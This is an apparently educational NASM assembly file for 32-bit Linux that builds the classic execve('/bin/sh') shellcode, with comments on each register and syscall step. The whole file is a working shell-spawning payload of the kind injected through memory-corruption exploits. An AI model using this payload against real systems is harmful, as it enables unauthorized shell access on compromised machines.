;Shellcode execve(/bin/sh, NULL, NULL)
[SECTION .text]

global _start

_start:
  
    xor eax, eax    ; clear EAX

    ; prepare first argument of execve /bin/sh in EBX

    push eax        ; NULL byte
    push 0x68732f2f ; //sh
    push 0x6e69622f ; /bin
    mov ebx, esp    ; ptr to /bin/sh

    ; prepare second argument of execve NULL in ECX

    xor ecx, ecx

    ; prepare third argument of execve NULL in EDX

    xor edx, edx    

    ; syscall execve(/bin/sh, NULL, NULL)

    mov al, 0xb     ; Syscall 11 execve
    int 0x80        ; Syscall

    ; exit 0 syscall

    xor eax, eax    ; clear EAX
    mov al, 1       ; Syscall 1 exit
    xor ebx, ebx    ; clear EBX
    int 0x80        ; Syscall

